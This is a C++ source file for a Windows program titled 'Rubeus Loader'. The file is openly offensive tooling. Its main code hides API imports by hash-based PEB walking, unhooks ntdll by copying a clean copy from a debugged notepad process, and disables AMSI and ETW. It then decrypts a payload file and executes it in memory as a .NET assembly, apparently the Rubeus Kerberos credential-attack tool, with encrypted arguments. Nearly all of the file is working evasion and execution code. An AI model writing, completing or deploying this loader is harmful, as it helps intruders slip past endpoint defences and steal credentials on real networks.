#include <Windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "amsi.lib")

#include "Helpers.h"
#include "AMSIBypass.h"
#include "CLR_COM_Interfaces.h"
#include "CLRHost_Manual.h"

// Include decryption components
#include "Decryptor.h"
#include "DecryptionKey.h"

// NEW: Include argument decryptor
#include "ETWBypass.h"
#include "ArgDecryptor.h"



using namespace std;

// ========================================
// Forward Declarations
// ========================================

DWORD calcHash(char* data);
HMODULE GetModuleFromPEB(DWORD wModuleHash);
uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash);
PROCESS_INFORMATION createProcessInDebug(wchar_t* processName);
VOID SetHWBP(DWORD_PTR address, HANDLE hThread);
int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth);

// ========================================
// Hash Calculation
// ========================================

DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

// ========================================
// PEB Walking
// ========================================

HMODULE GetModuleFromPEB(DWORD wModuleHash) {
#if defined(_WIN64)
#define PEBOffset 0x60
#define LdrOffset 0x18
#define ListOffset 0x10
    unsigned long long pPeb = __readgsqword(PEBOffset);
#elif defined(_WIN32)
#define PEBOffset 0x30
#define LdrOffset 0x0C
#define ListOffset 0x0C
    unsigned long pPeb = __readfsdword(PEBOffset);
#endif
    pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
    PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);

    while (pModuleList->DllBase) {
        char dll_name[MAX_PATH];
        // FIX: Use wcstombs_s for Visual Studio
        size_t convertedChars = 0;
        wcstombs_s(&convertedChars, dll_name, MAX_PATH,
            pModuleList->BaseDllName.Buffer, _TRUNCATE);

        if (calcHash(CharLowerA(dll_name)) == wModuleHash) {
            return (HMODULE)pModuleList->DllBase;
        }
        pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
    }
    return nullptr;
}

// ========================================
// API Resolution from PEB
// ========================================

uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash) {
#if defined(_WIN32)
    unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
    IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);

    if (idhDosHeader->e_magic == 0x5A4D) {
#if defined(_M_IX86)
        IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined(_M_AMD64)
        IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif
        if (inhNtHeader->Signature == 0x4550) {
            IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
                lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter) {
                char* szNames = reinterpret_cast<char*>(lpBase +
                    reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);

                if (calcHash(szNames) == ApiHash) {
                    unsigned short usOrdinal = reinterpret_cast<unsigned short*>(
                        lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
                    return reinterpret_cast<uintptr_t>(lpBase +
                        reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
                }
            }
        }
    }
#endif
    return 0;
}

// ========================================
// Create Process in Debug Mode
// ========================================

PROCESS_INFORMATION createProcessInDebug(wchar_t* processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    HMODULE hKernel_32 = GetModuleFromPEB(HASH_KERNEL32);
    TypeCreateProcessW CreateProcessWCustom = (TypeCreateProcessW)GetAPIFromPEBModule(hKernel_32, HASH_CreateProcessW);

    CreateProcessWCustom(processName, processName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);

    return pi;
}

// ========================================
// Hardware Breakpoint
// ========================================

VOID SetHWBP(DWORD_PTR address, HANDLE hThread) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;
    ctx.Dr0 = address;
    ctx.Dr7 = 0x00000001;

    SetThreadContext(hThread, &ctx);

    DEBUG_EVENT dbgEvent;
    while (true) {
        if (WaitForDebugEvent(&dbgEvent, INFINITE) == 0)
            break;

        if (dbgEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
            dbgEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {

            CONTEXT newCtx = { 0 };
            newCtx.ContextFlags = CONTEXT_ALL;
            GetThreadContext(hThread, &newCtx);

            if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (LPVOID)address) {
                printf("[+] Breakpoint Hit!\n");
                newCtx.Dr0 = newCtx.Dr6 = newCtx.Dr7 = 0;
                newCtx.EFlags |= (1 << 8);
                SetThreadContext(hThread, &newCtx);
                ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
                return;
            }
            else {
                newCtx.Dr0 = address;
                newCtx.Dr7 = 0x00000001;
                newCtx.EFlags &= ~(1 << 8);
                SetThreadContext(hThread, &newCtx);
            }
        }
        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }
}

// ========================================
// Copy Clean DLL from Debug Process
// ========================================

int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth) {
    HMODULE hKernel_32 = GetModuleFromPEB(HASH_KERNEL32);
    HMODULE hNtdll = GetModuleFromPEB(HASH_NTDLL);

    // FIX: Cast hash to DWORD for comparison
    _NtReadVirtualMemory NtReadVirtualMemoryCustom = (_NtReadVirtualMemory)GetAPIFromPEBModule(
        hNtdll, static_cast<DWORD>(HASH_NtReadVirtualMemory & 0xFFFFFFFF));
    TypeVirtualProtect VirtualProtectCustom = (TypeVirtualProtect)GetAPIFromPEBModule(hKernel_32, HASH_VirtualProtect);

    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)bAddress;
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)bAddress + ImgDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ntHeader->OptionalHeader;

    DWORD DllSize = OptHeader.SizeOfImage;
    PBYTE freshDll = new BYTE[DllSize];

    NTSTATUS status = (*NtReadVirtualMemoryCustom)(hProc, (PVOID)bAddress, freshDll, DllSize, 0);
    if (status != 0) {
        printf("[-] NtReadVirtualMemory failed: %d\n", status);
        delete[] freshDll;
        return 1;
    }

    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)(
            (unsigned long long)IMAGE_FIRST_SECTION(ntHeader) +
            ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp((char*)hookedSectionHeader->Name, (char*)".text") != 0)
            continue;

        DWORD oldProtection = 0;
        VirtualProtectCustom(
            (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
            hookedSectionHeader->Misc.VirtualSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtection
        );

        DWORD textSectionSize = hookedSectionHeader->Misc.VirtualSize;
        LPVOID srcAddr = (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
        LPVOID destAddr = (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);

        size_t chunkSize = CHUNK_SIZE;
        size_t numChunks = (textSectionSize + chunkSize - 1) / chunkSize;

        for (size_t j = 0; j < numChunks; j++) {
            size_t chunkStart = j * chunkSize;
            size_t chunkEnd = min(chunkStart + chunkSize, (size_t)textSectionSize);
            size_t currentChunkSize = chunkEnd - chunkStart;
            memcpy((char*)destAddr + chunkStart, (char*)srcAddr + chunkStart, currentChunkSize);
        }

        VirtualProtectCustom(
            (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
            hookedSectionHeader->Misc.VirtualSize,
            oldProtection,
            &oldProtection
        );

        delete[] freshDll;
        return 0;
    }

    delete[] freshDll;
    return 1;
}

// ========================================
// Main Function
// ========================================

int main(int argc, char* argv[]) {
    cout << "=========================================================" << endl;
    cout << "           Rubeus Loader - Advanced Edition             " << endl;
    cout << "   Unhooking + AMSI Bypass + Encrypted Payload Loader   " << endl;
    cout << "   + Encrypted Arguments Support                        " << endl;
    cout << "=========================================================" << endl;
    cout << endl;

    string payloadFile = "config.txt";

    // Parse command line arguments
    if (argc >= 2) {
        payloadFile = argv[1];
    }

    // ========================================
    // NEW: Check for Encrypted Arguments
    // ========================================

    string decryptedArgs;
    bool hasEncryptedArgs = false;
    vector<char*> decryptedArgv;

    if (ParseEncryptedArgs(argc, argv, decryptedArgs)) {
        hasEncryptedArgs = true;
        printf("[+] Using encrypted arguments\n");

        // Parse decrypted string into argv array
        ParseDecryptedArgsToArray(decryptedArgs, decryptedArgv);

        printf("[+] Parsed %zu arguments from encrypted data\n", decryptedArgv.size());
    }

    // ========================================
    // Phase 1: Unhook ntdll
    // ========================================

    printf("\n[*] Phase 1: Unhooking ntdll...\n");
    printf("[+] Creating debug process...\n");

    PROCESS_INFORMATION process = createProcessInDebug((wchar_t*)LR"(C:\Windows\System32\notepad.exe)");
    HANDLE hThread = process.hThread;

    HMODULE hNtdll = GetModuleFromPEB(HASH_NTDLL);
    _LdrLoadDll LdrLoadDllCustom = (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, HASH_LdrLoadDll);

    size_t LdrLoadDllAddress = reinterpret_cast<size_t>(LdrLoadDllCustom);
    printf("[+] LdrLoadDll address: 0x%llX\n", static_cast<unsigned long long>(LdrLoadDllAddress));

    printf("[+] Setting hardware breakpoint...\n");
    SetHWBP((DWORD_PTR)LdrLoadDllAddress, hThread);

    printf("[+] Copying clean ntdll...\n");
    size_t NtdllBAddress = reinterpret_cast<size_t>(hNtdll);

    int unhookResult = CopyDLLFromDebugProcess(process.hProcess, NtdllBAddress, FALSE);

    if (unhookResult == 0) {
        printf("[+] ntdll unhooked successfully!\n");
    }
    else {
        printf("[-] Failed to unhook ntdll!\n");

        // Cleanup
        if (hasEncryptedArgs) {
            CleanupArgArray(decryptedArgv);
        }

        return STATUS_UNHOOK_FAILED;
    }

    CloseHandle(process.hProcess);
    TerminateProcess(process.hProcess, 0);

    // ========================================
    // Phase 2: Bypass AMSI
    // ========================================

    printf("\n[*] Phase 2: Bypassing AMSI...\n");

    if (!BypassAMSI(3)) {
        printf("[-] AMSI bypass failed!\n");

        // Cleanup
        if (hasEncryptedArgs) {
            CleanupArgArray(decryptedArgv);
        }

        return STATUS_AMSI_BYPASS_FAILED;
    }

    // ========================================
    // Phase 3: Bypass ETW
    // ========================================

    printf("\n[*] Phase 3: Bypassing ETW...\n");
    BypassETW2();

    // ========================================
    // Phase 4: Load and Decrypt Payload
    // ========================================

    printf("\n[*] Phase 4: Loading encrypted payload...\n");
    printf("[+] Reading from: %s\n", payloadFile.c_str());

    vector<unsigned char> rubeusAssembly = LoadAndDecryptPayload(
        payloadFile,
        XOR_KEY,
        KEY_LENGTH
    );

    if (rubeusAssembly.empty()) {
        printf("[-] Failed to load/decrypt payload!\n");

        // Cleanup
        if (hasEncryptedArgs) {
            CleanupArgArray(decryptedArgv);
        }

        return STATUS_DECRYPT_FAILED;
    }

    printf("[+] Payload decrypted: %zu bytes\n", rubeusAssembly.size());

    if (!IsValidDotNetAssembly(rubeusAssembly)) {
        printf("[-] Invalid .NET assembly!\n");

        // Cleanup
        if (hasEncryptedArgs) {
            CleanupArgArray(decryptedArgv);
        }

        return STATUS_DECRYPT_FAILED;
    }

    printf("[+] Valid .NET assembly confirmed!\n");

    // ========================================
    // Phase 5: Execute Assembly
    // ========================================

    printf("\n[*] Phase 5: Executing .NET assembly...\n");

    // NEW: Use decrypted arguments if available, otherwise use command line
    int rubeusArgc;
    char** rubeusArgv;

    if (hasEncryptedArgs) {
        rubeusArgc = static_cast<int>(decryptedArgv.size());
        rubeusArgv = decryptedArgv.data();
        printf("[+] Using %d decrypted arguments\n", rubeusArgc);
    }
    else {
        // Use normal command line arguments (skip program name and config file)
        rubeusArgc = (argc > 2) ? argc - 2 : 0;
        rubeusArgv = (argc > 2) ? &argv[2] : NULL;

        if (rubeusArgc > 0) {
            printf("[+] Using %d command line arguments\n", rubeusArgc);
        }
        else {
            printf("[!] No arguments provided - Rubeus will show help\n");
        }
    }

    if (!ExecuteDotNetAssembly(rubeusAssembly, rubeusArgc, rubeusArgv)) {
        printf("[-] Failed to execute assembly!\n");

        // Cleanup
        if (hasEncryptedArgs) {
            CleanupArgArray(decryptedArgv);
        }

        return STATUS_EXECUTION_FAILED;
    }

    // ========================================
    // Cleanup
    // ========================================

    if (hasEncryptedArgs) {
        CleanupArgArray(decryptedArgv);
    }

    // ========================================
    // Done
    // ========================================



    return STATUS_SUCCESS;
}